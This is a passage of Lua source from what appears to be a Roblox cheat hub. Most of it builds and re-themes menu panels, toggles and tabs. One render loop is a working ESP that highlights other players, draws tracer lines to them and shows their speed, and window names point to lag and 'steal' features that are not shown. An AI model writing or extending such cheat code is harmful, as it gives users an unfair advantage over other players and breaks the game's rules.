                    obj.BackgroundColor3 = mapPurpleishToAccent(col, accent, dim)
                end
            end
            
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                local okT, tc = pcall(function() return obj.TextColor3 end)
                if okT and isPurpleishColor(tc) then
                    obj.TextColor3 = accent
                end
            end
        end
        if obj:IsA("UIStroke") then
            local ok, col = pcall(function() return obj.Color end)
            if ok and typeof(col) == "Color3" then
                if isNearBlack(col, 0.25) then
                    obj.Color = dim
                elseif isPurpleishColor(col) then
                    obj.Color = accent
                end
            end
        end
        if obj:IsA("UIGradient") then
            pcall(function()
                local seq = obj.Color
                local keys = seq.Keypoints
                local changed = false
                local newKeys = {}
                for i, kp in ipairs(keys) do
                    local c = kp.Value
                    if isPurpleishColor(c) then
                        c = mapPurpleishToAccent(c, accent, dim)
                        changed = true
                    end
                    table.insert(newKeys, ColorSequenceKeypoint.new(kp.Time, c))
                end
                if changed then
                    obj.Color = ColorSequence.new(newKeys)
                else
                    obj.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, UI_GRAD_TOP or row),
                        ColorSequenceKeypoint.new(1, UI_GRAD_BOT or bg),
                    })
                end
            end)
        end
    end

    recolor(root)
    for _, d in ipairs(root:GetDescendants()) do
        recolor(d)
    end
end


function M.recolorAllVynxGuis()
    local accent = (M.Theme and M.Theme.Accent) or UI_ACCENT or M.UI_ACCENT
    if not accent then return end
    local parents = {}
    pcall(function()
        local pg = player:FindFirstChild("PlayerGui")
        if pg then table.insert(parents, pg) end
    end)
    pcall(function()
        if gethui then table.insert(parents, gethui()) end
    end)
    pcall(function()
        table.insert(parents, game:GetService("CoreGui"))
    end)
    local names = {
        VynxHubUI=true, StealProgressWindow=true, VynxStatusUI=true,
        VynxPingLaggerGui=true, VynxLaggerGui=true, VynxMusicGui=true,
        MoveeDuels=true, VynxxHubUI=true,
    }
    
    local skip = {
        VynxSpeedBooster=true,
    }
    for _, parent in ipairs(parents) do
        if parent then
            for _, child in ipairs(parent:GetChildren()) do
                if skip[child.Name] then
                    
                elseif names[child.Name] or (typeof(child.Name) == "string" and string.find(string.lower(child.Name), "vynx") and not string.find(string.lower(child.Name), "speedbooster")) then
                    pcall(function() M.recolorBlacksToTheme(child) end)
                end
            end
        end
    end
    
    pcall(function()
        if M.statusMain then
            for _, d in ipairs(M.statusMain:GetDescendants()) do
                if d:IsA("TextLabel") and (d.Text == "VYNX DUELS V2.1" or string.find(tostring(d.Text), "VYNX")) then
                    d.TextColor3 = accent
                end
            end
        end
    end)
    pcall(function()
        if M.updateHeadTheme then M.updateHeadTheme() end
    end)
end

local CHERRY_ACCENT = CHERRY_THEMES[CherryConfig.Theme].Accent

RunService2.RenderStepped:Connect(function()
    local cam=workspace.CurrentCamera; if not cam then return end
    local lc=player.Character
    local lr=lc and lc:FindFirstChild("HumanoidRootPart")
    local lineStart=Vector2.new(cam.ViewportSize.X*0.5, cam.ViewportSize.Y*0.82)
    if lr then
        local rp,rv=cam:WorldToViewportPoint(lr.Position)
        if rv and rp.Z>0 then lineStart=Vector2.new(rp.X,rp.Y) end
    end
    for _,p in ipairs(Players:GetPlayers()) do
        if p==player then continue end
        local r=cherryCreateESP(p)
        local ch=p.Character
        local hum=ch and ch:FindFirstChildOfClass("Humanoid")
        local root=ch and ch:FindFirstChild("HumanoidRootPart")
        local head=ch and ch:FindFirstChild("Head")
        local alive=ch and hum and root and hum.Health>0
        if not alive then
            if r.Line then r.Line.Visible=false end
            r.Highlight.Enabled=false; r.Billboard.Enabled=false
            r.Highlight.Adornee=nil; r.Billboard.Adornee=nil
            continue
        end
        local liveAccent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255,255,255)
        r.Highlight.Adornee=ch; r.Highlight.Enabled=cherryESPState.LineESP
        r.Highlight.OutlineColor=liveAccent
        r.Highlight.FillColor=liveAccent
        r.Highlight.FillTransparency=0.85
        if r.Line then
            local tp,tv=cam:WorldToViewportPoint(root.Position)
            if cherryESPState.LineESP and tv and tp.Z>0 then
                r.Line.From=lineStart; r.Line.To=Vector2.new(tp.X,tp.Y)
                r.Line.Color=liveAccent; r.Line.Thickness=2.75; r.Line.Visible=true
            else r.Line.Visible=false end
        end
        if cherryESPState.SpeedESP and head then
            r.Billboard.Adornee=head; r.Billboard.Enabled=true
            r.SpeedText.Text=string.format("%.1f spd",cherryGetSpeed(root))
            r.SpeedText.TextColor3=liveAccent
        else r.Billboard.Enabled=false; r.Billboard.Adornee=nil end
    end
end)

function M.trackConn(conn) table.insert(M._persistentConns,conn); return conn end
function M.clearPersistentConns()
    for _,c in ipairs(M._persistentConns) do pcall(function() c:Disconnect() end) end
    M._persistentConns={}
end

function M.makeNumberCallback(tbl,key,min,max)
    return function(v)
        if min and v<min then return end
        if max and v>max then return end
        tbl[key]=v
        if key=="mobileButtonsSize" and M.mobileButtonsEnabled then M.buildMobileButtons() end
        if key=="stealBarSize" then M.buildStatusUI() end
        saveCherryConfig()
    end
end





local UI_ACCENT       = Color3.fromRGB(155, 105, 255)
local UI_ACCENT_DIM   = Color3.fromRGB(120, 90, 190)
local UI_BG_DARK      = Color3.fromRGB(16, 16, 20)
local UI_ROW_BG       = Color3.fromRGB(28, 28, 34)
local UI_CARD_STROKE  = Color3.fromRGB(48, 48, 56)
local UI_TEXT_WHITE   = Color3.fromRGB(255,255,255)
local UI_TEXT_PRIMARY = Color3.fromRGB(235, 235, 240)
local UI_TEXT_DIM     = Color3.fromRGB(140, 140, 155)
local UI_TEXT_SECTION = Color3.fromRGB(155, 105, 255)
local UI_BTN_BG       = Color3.fromRGB(36, 36, 44)
local UI_TOGGLE_OFF   = Color3.fromRGB(50, 50, 60)
local UI_TOGGLE_KNOB  = Color3.fromRGB(180, 180, 190)
local UI_KNOB_ON      = Color3.fromRGB(255, 255, 255)
local UI_GRAD_TOP     = Color3.fromRGB(28, 26, 36)
local UI_GRAD_BOT     = Color3.fromRGB(14, 14, 18)
local UI_SIDEBAR_BG   = Color3.fromRGB(12, 12, 16)



pcall(applyAccentFromTheme)

do
    local a = M.UI_ACCENT or (M.Theme and M.Theme.Accent)
    if a then
        UI_ACCENT = a
        CHERRY_ACCENT = a
        UI_ACCENT_DIM = M.UI_ACCENT_DIM or a
        UI_TEXT_SECTION = a
    end
    if M.UI_BG_DARK then UI_BG_DARK = M.UI_BG_DARK end
    if M.UI_ROW_BG then UI_ROW_BG = M.UI_ROW_BG end
    if M.UI_BTN_BG then UI_BTN_BG = M.UI_BTN_BG end
    if M.UI_TOGGLE_OFF then UI_TOGGLE_OFF = M.UI_TOGGLE_OFF end
    if M.UI_GRAD_TOP then UI_GRAD_TOP = M.UI_GRAD_TOP end
    if M.UI_GRAD_BOT then UI_GRAD_BOT = M.UI_GRAD_BOT end
    if M.UI_CARD_STROKE then UI_CARD_STROKE = M.UI_CARD_STROKE end
end

local UI_TWEEN_FAST = TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
local UI_TWEEN_MED  = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)


local function uiCardStyle(f)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,12); c.Parent = f
    local s = Instance.new("UIStroke"); s.Thickness = 1; s.Color = UI_CARD_STROKE or Color3.fromRGB(45, 45, 45); s.Transparency = 0.45; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = f
    local g = Instance.new("UIGradient"); g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, UI_GRAD_TOP or Color3.fromRGB(25, 25, 25)),
        ColorSequenceKeypoint.new(1, UI_GRAD_BOT or Color3.fromRGB(10, 10, 10))
    }); g.Rotation = 45; g.Parent = f
end

local function uiSmallBtn(p)
    local b = Instance.new("TextButton")
    b.Position = p.Pos or UDim2.new(0,0,0,0); b.Size = p.Size or UDim2.new(0,40,0,23)
    b.BackgroundColor3 = p.Bg or UI_BTN_BG; b.BorderSizePixel = 0
    b.Text = p.Text or ""; b.TextColor3 = p.Col or UI_TEXT_DIM; b.TextSize = p.TS or 11
    b.Font = Enum.Font.GothamBold; b.AutoButtonColor = false; b.ZIndex = p.Z or 1; b.Parent = p.Parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,p.CR or 6); c.Parent = b
    return b
end

local function uiAccentBar(parent, on)
    local b = Instance.new("Frame")
    b.Position = UDim2.new(0,0,0.5,-11); b.Size = UDim2.new(0,3,0,22)
    b.BackgroundColor3 = on and UI_ACCENT or UI_TEXT_WHITE
    b.BackgroundTransparency = on and 0 or 1; b.BorderSizePixel = 0; b.Parent = parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,2); c.Parent = b
    return b
end

local function uiAutoCanvas(scroll)
    local lay = scroll:FindFirstChildOfClass("UIListLayout"); if not lay then return end
    local pad = scroll:FindFirstChildOfClass("UIPadding")
    local function upd()
        local padBottom = (pad and pad.PaddingBottom.Offset or 0)
        local padTop = (pad and pad.PaddingTop.Offset or 0)
        local h = lay.AbsoluteContentSize.Y + padBottom + padTop + 24
        scroll.CanvasSize = UDim2.new(0, 0, 0, math.max(h, 1))
    end
    lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(upd)
    task.defer(upd)
    task.delay(0.15, upd)
    task.delay(0.5, upd)
end

local function uiSectionHeader(parent, text)
    local r = Instance.new("Frame"); r.Size = UDim2.new(1,0,0,24); r.BackgroundTransparency = 1; r.Parent = parent
    local b = Instance.new("Frame"); b.Position = UDim2.new(0,0,0.5,-6); b.Size = UDim2.new(0,3,0,13)
    b.BackgroundColor3 = UI_ACCENT; b.BorderSizePixel = 0; b.Parent = r
    Instance.new("UICorner",b).CornerRadius = UDim.new(0,2)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,12,0,0); l.Size = UDim2.new(1,-12,1,0)
    l.BackgroundTransparency = 1; l.Text = text; l.TextColor3 = UI_TEXT_SECTION; l.TextSize = 11
    l.Font = Enum.Font.GothamBold; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    return r
end

local function uiInputRow(parent, label, def, hidden)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0
    if hidden then r.Visible = false end; r.Parent = parent; uiCardStyle(r)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,13,0,0); l.Size = UDim2.new(1,-84,1,0)
    l.BackgroundTransparency = 1; l.Text = label; l.TextColor3 = UI_TEXT_PRIMARY; l.TextSize = 13
    l.Font = Enum.Font.GothamMedium; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    local bx = Instance.new("TextBox"); bx.Position = UDim2.new(1,-66,0.5,-12); bx.Size = UDim2.new(0,56,0,25)
    bx.BackgroundColor3 = UI_BTN_BG; bx.BorderSizePixel = 0; bx.Text = tostring(def); bx.TextColor3 = UI_ACCENT
    bx.TextSize = 13; bx.Font = Enum.Font.GothamBold; bx.Parent = r
    Instance.new("UICorner",bx).CornerRadius = UDim.new(0,6)
    return r, bx
end

local function uiToggleRow(parent, label, on, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,46)
    r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local bar = uiAccentBar(r, on)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,14,0,0); l.Size = UDim2.new(1,-74,1,0)
    l.BackgroundTransparency = 1; l.Text = label; l.TextColor3 = UI_TEXT_PRIMARY; l.TextSize = 14
    l.Font = Enum.Font.GothamMedium; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r

    local _acc0 = liveAccent()
    local _off0 = liveToggleOff()
    local tb = Instance.new("TextButton"); tb.Position = UDim2.new(1,-54,0.5,-11); tb.Size = UDim2.new(0,44,0,22)
    tb.BackgroundColor3 = on and _acc0 or _off0; tb.BorderSizePixel = 0; tb.Text = ""; tb.AutoButtonColor = false; tb.Parent = r
    Instance.new("UICorner",tb).CornerRadius = UDim.new(0,11)
    local knob = Instance.new("Frame"); knob.Size = UDim2.new(0,16,0,16); knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
    knob.BackgroundColor3 = on and liveKnobOn() or liveKnobOff(); knob.Parent = tb
    Instance.new("UICorner",knob)

    local state = on
    local function set(v)
        state = v
        local acc = liveAccent()
        local off = liveToggleOff()
        TweenService:Create(tb, UI_TWEEN_FAST, {BackgroundColor3 = v and acc or off}):Play()
        TweenService:Create(knob, UI_TWEEN_FAST, {Position = v and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8), BackgroundColor3 = v and liveKnobOn() or liveKnobOff()}):Play()
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = v and 0 or 1}):Play()
        bar.BackgroundColor3 = acc
    end
    tb.MouseButton1Click:Connect(function()
        set(not state)
        if callback then callback(state) end
        saveCherryConfig()
    end)
    return r, set
end

local function uiActionRow(parent, label, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,42)
    r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,1,0); btn.BackgroundTransparency = 1
    btn.Text = label; btn.TextColor3 = UI_TEXT_PRIMARY; btn.TextSize = 14; btn.Font = Enum.Font.GothamBold; btn.Parent = r
    local bar = uiAccentBar(r, false)

    btn.MouseButton1Click:Connect(function()
        bar.BackgroundColor3 = UI_ACCENT
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 0}):Play()
        task.delay(0.3, function() TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 1}):Play() end)
        if callback then callback() end
    end)
    return r, btn
end

local function uiNumberRow(parent, label, value, minV, maxV, callback)
    local r, bx = uiInputRow(parent, label, value)
    bx.FocusLost:Connect(function()
        local n = tonumber(bx.Text)
        if n and n >= minV and n <= maxV then
            if callback then callback(n) end
            saveCherryConfig()
        else
            bx.Text = tostring(value)
        end
    end)
    return r, bx
end

local function uiChoiceRow(parent, label, options, defaultIndex, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.43,0,0,44); l.BackgroundTransparency=1
    l.Text=label; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
    local la = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-174,0,8), Size=UDim2.new(0,29,0,27), Text="<", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local vl = Instance.new("TextLabel"); vl.Position=UDim2.new(1,-141,0,8); vl.Size=UDim2.new(0,102,0,27)
    vl.BackgroundColor3=UI_BTN_BG; vl.BorderSizePixel=0; vl.Text=options[defaultIndex or 1]; vl.TextColor3=UI_TEXT_PRIMARY; vl.TextSize=10; vl.Font=Enum.Font.GothamBold; vl.Parent=r
    Instance.new("UICorner",vl).CornerRadius=UDim.new(0,7)
    local ra = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-35,0,8), Size=UDim2.new(0,29,0,27), Text=">", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local idx = defaultIndex or 1
    local function upd()
        vl.Text = options[idx]
        if callback then callback(options[idx]) end
        saveCherryConfig()
    end
    la.MouseButton1Click:Connect(function() idx=idx-1; if idx<1 then idx=#options end; upd() end)
    ra.MouseButton1Click:Connect(function() idx=idx+1; if idx>#options then idx=1 end; upd() end)
    local function setVal(v)
        for i,o in ipairs(options) do if o==v then idx=i; vl.Text=o; break end end
    end
    return r, setVal
end

local ARROW_GLOW_TRANSPARENCY = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.82, 0),
    NumberSequenceKeypoint.new(0.28, 0.06, 0),
    NumberSequenceKeypoint.new(0.52, 0.22, 0),
    NumberSequenceKeypoint.new(1, 0.82, 0),
})

local function styleArrowButton(arrow)
    
    local border = Instance.new("UIStroke")
    border.Name = "AnimatedArrowBorder"
    border.Color = Color3.fromRGB(255, 255, 255)
    border.Thickness = 1.8
    border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    border.Transparency = 0.05
    border.Parent = arrow
    local bg = Instance.new("UIGradient")
    bg.Rotation = 135
    bg.Transparency = ARROW_GLOW_TRANSPARENCY
    bg.Parent = border

    local glow = Instance.new("UIStroke")
    glow.Name = "AnimatedArrowGlow"
    glow.Color = Color3.fromRGB(255, 255, 255)
    glow.Thickness = 3.6
    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    glow.Transparency = 0.58
    glow.Parent = arrow
    local gg = Instance.new("UIGradient")
    gg.Name = "GlowGradient"
    gg.Rotation = 180
    gg.Transparency = ARROW_GLOW_TRANSPARENCY
    gg.Parent = glow
end

local function styleOptionChip(btn, active)
    
    btn.TextColor3 = Color3.fromRGB(0, 0, 0)
    btn.BackgroundColor3 = active and UI_ACCENT or Color3.fromRGB(220, 220, 225)
    local stroke = btn:FindFirstChildOfClass("UIStroke")
    if not stroke then
        stroke = Instance.new("UIStroke")
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = btn
    end
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Thickness = active and 2 or 1.4
    stroke.Transparency = 0
    local ts = btn:FindFirstChildOfClass("UIStroke")
    
    btn.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextStrokeTransparency = 0
end

local function uiExpandToggleRow(parent, label, on, options, defaultIndex, onToggle, onOption)
    
    local container = Instance.new("Frame")
    container.BackgroundTransparency = 1
    container.Size = UDim2.new(1, 0, 0, 46)
    container.AutomaticSize = Enum.AutomaticSize.Y
    container.ClipsDescendants = false
    container.Parent = parent

    local col = Instance.new("UIListLayout")
    col.FillDirection = Enum.FillDirection.Vertical
    col.SortOrder = Enum.SortOrder.LayoutOrder
    col.Padding = UDim.new(0, 6)
    col.Parent = container

    
    local r = Instance.new("Frame")
    r.LayoutOrder = 1
    r.ClipsDescendants = true
    r.Size = UDim2.new(1, 0, 0, 46)
    r.BackgroundColor3 = UI_ROW_BG
    r.BackgroundTransparency = 0.1
    r.BorderSizePixel = 0
    r.Parent = container
    uiCardStyle(r)

    local bar = uiAccentBar(r, on)
    local l = Instance.new("TextLabel")
    l.Position = UDim2.new(0, 14, 0, 0)
    l.Size = UDim2.new(1, -110, 1, 0)
    l.BackgroundTransparency = 1
    l.Text = label
    l.TextColor3 = UI_TEXT_PRIMARY
    l.TextSize = 14
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = r

    local expanded = false
    local arrow = Instance.new("TextButton")
    arrow.Name = "ArrowButton"
    arrow.Position = UDim2.new(1, -100, 0.5, -13)
    arrow.Size = UDim2.new(0, 36, 0, 26)
    arrow.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    arrow.BackgroundTransparency = 0.1
    arrow.BorderSizePixel = 0
    arrow.Text = "▼"
    arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
    arrow.TextSize = 14
    arrow.Font = Enum.Font.GothamBlack
    arrow.AutoButtonColor = false
    arrow.Parent = r
    Instance.new("UICorner", arrow).CornerRadius = UDim.new(0, 7)
    styleArrowButton(arrow)

    local tb = Instance.new("TextButton")
    tb.Position = UDim2.new(1, -54, 0.5, -11)
    tb.Size = UDim2.new(0, 44, 0, 22)
    tb.BackgroundColor3 = on and UI_ACCENT or UI_TOGGLE_OFF
    tb.BorderSizePixel = 0
    tb.Text = ""
    tb.AutoButtonColor = false
    tb.Parent = r
    Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 11)
    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0, 16, 0, 16)
    knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
    knob.BackgroundColor3 = on and UI_KNOB_ON or UI_TOGGLE_KNOB
    knob.Parent = tb
    Instance.new("UICorner", knob)

    
    
    local useScroll = #options > 4
    local optFrame = Instance.new("Frame")
    optFrame.LayoutOrder = 2
    optFrame.Size = UDim2.new(1, 0, 0, useScroll and 140 or 40)
    optFrame.BackgroundColor3 = UI_ROW_BG
    optFrame.BackgroundTransparency = 0.12
    optFrame.BorderSizePixel = 0
    optFrame.Visible = false
    optFrame.ClipsDescendants = true
    optFrame.Parent = container
    uiCardStyle(optFrame)

    local optPad = Instance.new("UIPadding")
    optPad.PaddingLeft = UDim.new(0, 8)
    optPad.PaddingRight = UDim.new(0, 8)
    optPad.PaddingTop = UDim.new(0, 6)
    optPad.PaddingBottom = UDim.new(0, 6)
    optPad.Parent = optFrame

    local optParent = optFrame
    if useScroll then
        local scroll = Instance.new("ScrollingFrame")
        scroll.Name = "OptionsScroll"
        scroll.Size = UDim2.new(1, -4, 1, -4)
        scroll.Position = UDim2.new(0, 2, 0, 2)
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 5
        scroll.ScrollBarImageColor3 = UI_ACCENT
        scroll.ScrollingDirection = Enum.ScrollingDirection.Y
        scroll.ElasticBehavior = Enum.ElasticBehavior.Always
        scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scroll.Parent = optFrame
        local sPad = Instance.new("UIPadding")
        sPad.PaddingLeft = UDim.new(0, 6)
        sPad.PaddingRight = UDim.new(0, 8)
        sPad.PaddingTop = UDim.new(0, 4)
        sPad.PaddingBottom = UDim.new(0, 8)
        sPad.Parent = scroll
        local sLay = Instance.new("UIListLayout")
        sLay.FillDirection = Enum.FillDirection.Vertical
        sLay.Padding = UDim.new(0, 5)
        sLay.SortOrder = Enum.SortOrder.LayoutOrder
        sLay.Parent = scroll
        optParent = scroll
    else
        local optLayout = Instance.new("UIListLayout")
        optLayout.FillDirection = Enum.FillDirection.Horizontal
        optLayout.Padding = UDim.new(0, 6)
        optLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        optLayout.SortOrder = Enum.SortOrder.LayoutOrder
        optLayout.Parent = optFrame
    end

    
    local settingsHost = Instance.new("Frame")
    settingsHost.Name = "ModeSettings"
    settingsHost.LayoutOrder = 3
    settingsHost.Size = UDim2.new(1, 0, 0, 0)
    settingsHost.AutomaticSize = Enum.AutomaticSize.Y
    settingsHost.BackgroundTransparency = 1
    settingsHost.Visible = false
    settingsHost.Parent = container

    local settingsLayout = Instance.new("UIListLayout")
    settingsLayout.Padding = UDim.new(0, 6)
    settingsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    settingsLayout.Parent = settingsHost

    local idx = defaultIndex or 1
    local optionBtns = {}
    local state = on
    local modeSettings = {}

    local function refreshOptionVisuals()
        for i, b in ipairs(optionBtns) do
            styleOptionChip(b, i == idx)
        end
    end

    local function refreshModeSettings()
        local any = false
        for lab, fr in pairs(modeSettings) do
            local show = expanded and (lab == options[idx])
            fr.Visible = show
            if show then any = true end
        end
        settingsHost.Visible = any
        
    end

    for i, opt in ipairs(options) do
        local b = Instance.new("TextButton")
        b.LayoutOrder = i
        if useScroll then
            b.Size = UDim2.new(1, -4, 0, 30)
        else
            b.Size = UDim2.new(0, math.max(56, #tostring(opt) * 9 + 18), 0, 28)
        end
        b.BorderSizePixel = 0
        b.Text = tostring(opt)
        b.TextSize = useScroll and 12 or 12
        b.Font = Enum.Font.GothamBlack
        b.TextXAlignment = useScroll and Enum.TextXAlignment.Left or Enum.TextXAlignment.Center
        b.AutoButtonColor = false
        b.Parent = optParent
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
        if useScroll then
            local p = Instance.new("UIPadding")
            p.PaddingLeft = UDim.new(0, 10)
            p.Parent = b
        end
        styleOptionChip(b, i == idx)
        b.MouseButton1Click:Connect(function()
            idx = i
            refreshOptionVisuals()
            refreshModeSettings()
            if onOption then onOption(options[idx]) end
            saveCherryConfig()
        end)
        optionBtns[i] = b
    end

    local function setExpanded(v)
        expanded = v
        optFrame.Visible = v
        arrow.Text = v and "▲" or "▼"
        refreshModeSettings()
    end

    arrow.MouseButton1Click:Connect(function()
        setExpanded(not expanded)
    end)

    local function set(v)
        state = v
        local acc = liveAccent()
        local off = liveToggleOff()
        TweenService:Create(tb, UI_TWEEN_FAST, {BackgroundColor3 = v and acc or off}):Play()
        TweenService:Create(knob, UI_TWEEN_FAST, {
            Position = v and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8),
            BackgroundColor3 = v and liveKnobOn() or liveKnobOff()
        }):Play()
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = v and 0 or 1}):Play()
        bar.BackgroundColor3 = acc
    end

    tb.MouseButton1Click:Connect(function()
        set(not state)
        if onToggle then onToggle(state) end
        saveCherryConfig()
    end)

    local function setOption(v)
        for i, o in ipairs(options) do
            if o == v then
                idx = i
                refreshOptionVisuals()
                refreshModeSettings()
                break
            end
        end
    end

    local function registerModeSettings(optionLabel, frame)
        frame.Parent = settingsHost
        frame.Visible = false
        frame.Size = UDim2.new(1, 0, 0, 0)
        frame.AutomaticSize = Enum.AutomaticSize.Y
        modeSettings[optionLabel] = frame
        task.defer(refreshModeSettings)
    end

    return container, set, setOption, registerModeSettings, function() return options[idx] end
end

local function uiMakePage(parent, name, order, vis)
    local p = Instance.new("ScrollingFrame"); p.Name=name; p.Visible=vis~=false; p.LayoutOrder=order
    p.Size=UDim2.new(1,0,1,0); p.BackgroundTransparency=1; p.BorderSizePixel=0
    p.ScrollBarThickness=8
    p.ScrollBarImageColor3=UI_ACCENT
    p.ScrollBarImageTransparency=0.15
    p.ScrollingEnabled=true
    p.ScrollingDirection=Enum.ScrollingDirection.Y
    p.ElasticBehavior=Enum.ElasticBehavior.Always
    p.AutomaticCanvasSize=Enum.AutomaticSize.Y
    p.CanvasSize=UDim2.new(0,0,0,0)
    p.Parent=parent
    local l = Instance.new("UIListLayout"); l.Padding=UDim.new(0,7); l.SortOrder=Enum.SortOrder.LayoutOrder; l.Parent=p
    local pd = Instance.new("UIPadding")
    pd.PaddingTop=UDim.new(0,4)
    pd.PaddingBottom=UDim.new(0,40)
    pd.PaddingRight=UDim.new(0,6)
    pd.PaddingLeft=UDim.new(0,2)
    pd.Parent=p
    uiAutoCanvas(p)
    return p
end

local function uiMakeTab(parent, name, text, pos, active)
    local b = Instance.new("TextButton")
    b.Name = name or "Tab"
    b.Size = UDim2.new(1, -8, 0, 36)
    local acc = UI_ACCENT or (M.Theme and M.Theme.Accent) or Color3.fromRGB(255, 255, 255)
    local tabOn = UI_ROW_BG or themeDarkFromAccent(acc, 0.22)
    b.BackgroundColor3 = active and tabOn or Color3.fromRGB(14, 14, 18)
    b.BackgroundTransparency = active and 0.05 or 1
    b.BorderSizePixel = 0
    b.Text = tostring(text or "")
    b.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(140, 140, 155)
    b.TextSize = 12
    b.Font = Enum.Font.GothamBold
    b.TextXAlignment = Enum.TextXAlignment.Center
    b.AutoButtonColor = false
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 9)
    local stroke = Instance.new("UIStroke")
    stroke.Name = "TabStroke"
    stroke.Color = active and acc or Color3.fromRGB(36, 36, 44)
    stroke.Thickness = 1
    stroke.Transparency = active and 0.35 or 1
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = b
    b:SetAttribute("IsActiveTab", active and true or false)
    b.MouseEnter:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {BackgroundTransparency = 0.35, TextColor3 = Color3.fromRGB(220, 220, 230)}):Play()
        end
    end)
    b.MouseLeave:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(140, 140, 155)}):Play()
        end
    end)
    return b
end







function M.destroyAntiDesyncUI()
    if M.antiDesyncConn then pcall(function() M.antiDesyncConn:Disconnect() end); M.antiDesyncConn = nil end
    if M.antiDesyncGui then pcall(function() M.antiDesyncGui:Destroy() end); M.antiDesyncGui = nil end
    M.antiDesyncMain = nil
    M.antiDesyncPill = nil
end

function M.applyAntiDesyncTheme()
    local main = M.antiDesyncMain
    if not main or not main.Parent then return end
    local accent = UI_ACCENT or Color3.fromRGB(255, 255, 255)
    local bg = UI_BG_DARK or Color3.fromRGB(0, 0, 0)
    main.BackgroundColor3 = bg
    local st = main:FindFirstChild("MainStroke")
    if st then st.Color = accent end
    local title = main:FindFirstChild("Header", true) and main.Header:FindFirstChild("Title")
    if not title then
        for _, d in ipairs(main:GetDescendants()) do
            if d.Name == "Title" and d:IsA("TextLabel") then title = d break end
        end
    end
    if title then title.TextColor3 = accent end
    pcall(function() M.applyCustomBackground(main) end)
end

function M.buildAntiDesyncUI()
    pcall(function() M.buildSpeedBoosterUI() end)
    M.destroyAntiDesyncUI()

    local accent = UI_ACCENT or Color3.fromRGB(255, 255, 255)
